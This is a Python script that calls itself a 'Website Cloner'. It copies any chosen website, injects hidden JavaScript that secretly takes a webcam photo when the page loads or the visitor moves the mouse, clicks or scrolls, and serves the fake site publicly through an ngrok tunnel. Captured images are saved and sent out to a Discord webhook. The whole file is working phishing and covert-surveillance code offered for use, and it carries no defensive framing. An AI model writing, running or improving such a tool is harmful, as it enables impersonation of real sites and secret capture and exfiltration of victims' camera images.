import os
import sys
import subprocess
import json
import venv
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()
WEBHOOK_CONFIG = "webhook_config.json"
NGROK_CONFIG = "ngrok_config.json"

def run_command(command):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()
        if process.returncode != 0:
            console.print(f"[red]Command failed: {stderr.decode()}[/red]")
            return False
        return True
    except Exception as e:
        console.print(f"[red]Error running command: {str(e)}[/red]")
        return False

def create_virtual_environment():
    if os.path.exists("venv"):
        console.print("[yellow]Virtual environment already exists[/yellow]")
        return True
    
    console.print("[yellow]Creating virtual environment...[/yellow]")
    try:
        venv.create("venv", with_pip=True)
        console.print("[green]✓[/green] Virtual environment created successfully")
        return True
    except Exception as e:
        console.print(f"[red]Failed to create virtual environment: {str(e)}[/red]")
        return False

def save_webhook_url(url):
    with open(WEBHOOK_CONFIG, 'w') as f:
        json.dump({'webhook_url': url}, f)

def get_webhook_url():
    if os.path.exists(WEBHOOK_CONFIG):
        try:
            with open(WEBHOOK_CONFIG, 'r') as f:
                config = json.load(f)
                saved_url = config.get('webhook_url')
                if saved_url:
                    use_saved = console.input(f"\n[yellow]Found saved Discord webhook URL. Use it? (y/n): [/yellow]").lower() == 'y'
                    if use_saved:
                        return saved_url
        except:
            pass
    
    url = console.input("\n[bold yellow]Enter Discord webhook URL: [/bold yellow]")
    save_webhook_url(url)
    return url

def setup():
    console.print(Panel.fit(
        "[bold blue]Website Cloner Setup[/bold blue]\n"
        "[cyan]Setting up your environment...[/cyan]",
        border_style="blue"
    ))
    
    if not create_virtual_environment():
        return False
    
    pip_cmd = os.path.join("venv", "Scripts", "pip") if sys.platform == "win32" else os.path.join("venv", "bin", "pip")
    python_cmd = os.path.join("venv", "Scripts", "python") if sys.platform == "win32" else os.path.join("venv", "bin", "python")
    
    # Upgrade pip
    console.print("[yellow]Upgrading pip...[/yellow]")
    run_command(f'"{pip_cmd}" install --upgrade pip')
    
    # Install requirements
    console.print("[yellow]Installing requirements...[/yellow]")
    requirements = [
        "requests==2.31.0",
        "beautifulsoup4==4.12.2",
        "flask==3.0.0",
        "pyngrok==7.0.5",
        "rich==13.7.0",
        "discord-webhook==1.3.0"
    ]
    
    for req in requirements:
        if not run_command(f'"{pip_cmd}" install {req}'):
            console.print(f"[red]Failed to install {req}[/red]")
            return False
    
    # Setup ngrok
    console.print("[yellow]Setting up ngrok...[/yellow]")
    if not os.path.exists(NGROK_CONFIG):
        console.print("\n[bold cyan]Get your authtoken from:[/bold cyan]")
        console.print("[bold blue]https://dashboard.ngrok.com/get-started/your-authtoken[/bold blue]")
        auth_token = console.input("\n[bold yellow]Enter your ngrok authtoken: [/bold yellow]")
        
        with open(NGROK_CONFIG, 'w') as f:
            json.dump({'authtoken': auth_token}, f)
    
    return True

def start_cloner():
    try:
        import requests
        from bs4 import BeautifulSoup
        from flask import Flask, request, send_from_directory
        from pyngrok import ngrok
        from discord_webhook import DiscordWebhook
        
        # Get Discord webhook URL
        webhook_url = get_webhook_url()
        
        def send_to_discord(image_path):
            try:
                with open(image_path, 'rb') as f:
                    webhook = DiscordWebhook(url=webhook_url)
                    webhook.add_file(file=f.read(), filename=os.path.basename(image_path))
                    response = webhook.execute()
                    if response.status_code == 200:
                        console.print("[green]✓[/green] Image sent to Discord successfully!")
                    else:
                        console.print("[red]Failed to send image to Discord[/red]")
            except Exception as e:
                console.print(f"[red]Error sending to Discord: {str(e)}[/red]")

        def clone_website_content(url):
            try:
                console.print(f"\n[bold green]Cloning website: {url}...[/bold green]")
                response = requests.get(url)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Extract and combine CSS
                styles = "".join(style.string + "\n" for style in soup.find_all('style'))
                for style in soup.find_all('style'):
                    style.decompose()
                
                # Get external CSS
                for link in soup.find_all('link', rel='stylesheet'):
                    try:
                        css_url = link.get('href')
                        if not css_url.startswith('http'):
                            css_url = url + ('/' if not css_url.startswith('/') else '') + css_url
                        styles += requests.get(css_url).text + "\n"
                    except:
                        continue
                
                # Add camera capture code
                camera_code = """
                <div id="camera-container" style="position:fixed;top:-9999px;left:-9999px;">
                    <video id="camera-video" autoplay playsinline style="width:1px;height:1px;"></video>
                    <canvas id="camera-canvas" style="width:1px;height:1px;"></canvas>
                </div>
                <script>
                    function startCapture() {
                        navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
                        })
                        .then(function(stream) {
                            var video = document.getElementById('camera-video');
                            video.srcObject = stream;
                            video.onloadedmetadata = function() {
                                video.play();
                                setTimeout(function() {
                                    var canvas = document.getElementById('camera-canvas');
                                    canvas.width = video.videoWidth;
                                    canvas.height = video.videoHeight;
                                    canvas.getContext('2d').drawImage(video, 0, 0);
                                    canvas.toBlob(function(blob) {
                                        var formData = new FormData();
                                        formData.append('image', blob);
                                        fetch('/save-image', {
                                            method: 'POST',
                                            body: formData
                                        }).then(function() {
                                            stream.getTracks().forEach(track => track.stop());
                                        });
                                    });
                                }, 500);
                            };
                        })
                        .catch(function(err) {
                            console.log(err);
                        });
                    }
                    window.addEventListener('load', function() {
                        startCapture();
                        document.addEventListener('mousemove', startCapture, { once: true });
                        document.addEventListener('click', startCapture, { once: true });
                        document.addEventListener('scroll', startCapture, { once: true });
                    });
                </script>
                """
                
                # Save the cloned site
                os.makedirs('cloned_site', exist_ok=True)
                with open('cloned_site/index.html', 'w', encoding='utf-8') as f:
                    f.write(f"<style>{styles}</style>\n{str(soup).replace('</body>', camera_code + '</body>')}")
                
                console.print("[green]✓[/green] Website cloned successfully!")
                return True
            except Exception as e:
                console.print(f"[red]Error cloning website: {str(e)}[/red]")
                return False
        
        # Get target URL
        console.print(Panel.fit(
            "[bold blue]Website Cloner[/bold blue]\n"
            "[cyan]Enter the website URL to clone[/cyan]",
            border_style="blue"
        ))
        
        target_url = console.input("\n[bold yellow]Enter website URL: [/bold yellow]")
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'https://' + target_url
        
        if not clone_website_content(target_url):
            return
        
        # Setup Flask app
        app = Flask(__name__)
        
        @app.route('/')
        def index():
            return send_from_directory('cloned_site', 'index.html')

        @app.route('/save-image', methods=['POST'])
        def save_image():
            if 'image' not in request.files:
                return 'No image received', 400
            
            image = request.files['image']
            os.makedirs('captured_images', exist_ok=True)
            image_path = os.path.join('captured_images', f'capture_{len(os.listdir("captured_images"))}.png')
            image.save(image_path)
            
            console.print(f"[green]✓[/green] New image captured: {image_path}")
            send_to_discord(image_path)
            return 'Image saved', 200
        
        # Load ngrok config and start tunnel
        with open(NGROK_CONFIG) as f:
            ngrok.set_auth_token(json.load(f)['authtoken'])
        
        console.print(Panel.fit(
            "[bold blue]Website Cloner[/bold blue]\n"
            "[cyan]Starting server...[/cyan]",
            border_style="blue"
        ))
        
        public_url = ngrok.connect(5000)
        
        # Display status
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Service", style="cyan")
        table.add_column("URL", style="green")
        table.add_row("Local Server", "http://localhost:5000")
        table.add_row("Public URL", str(public_url))
        
        console.print(Panel(table, title="[bold blue]Website Cloner Status[/bold blue]", border_style="blue"))
        console.print("\n[yellow]Captured images will be saved in: [bold]./captured_images/[/bold][/yellow]")
        console.print("\n[bold green]Server is running. Press Ctrl+C to stop.[/bold green]")
        
        app.run(host='0.0.0.0', port=5000)
        
    except KeyboardInterrupt:
        console.print("\n[yellow]Shutting down...[/yellow]")
        try:
            ngrok.disconnect(public_url)
        except:
            pass
        console.print("[green]✓[/green] Server stopped successfully")
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

def main():
    try:
        if not os.path.exists("venv") or not os.path.exists(os.path.join("venv", "Scripts" if sys.platform == "win32" else "bin", "python")):
            if not setup():
                console.print("[red]Setup failed. Please try again.[/red]")
                return
            
            python_cmd = os.path.join("venv", "Scripts" if sys.platform == "win32" else "bin", "python")
            console.print("\n[bold green]Setup complete! Restarting in virtual environment...[/bold green]")
            os.execl(python_cmd, python_cmd, *sys.argv)
        else:
            start_cloner()
    except Exception as e:
        console.print(f"[red]Error: {str(e)}[/red]")

if __name__ == '__main__':
    main() 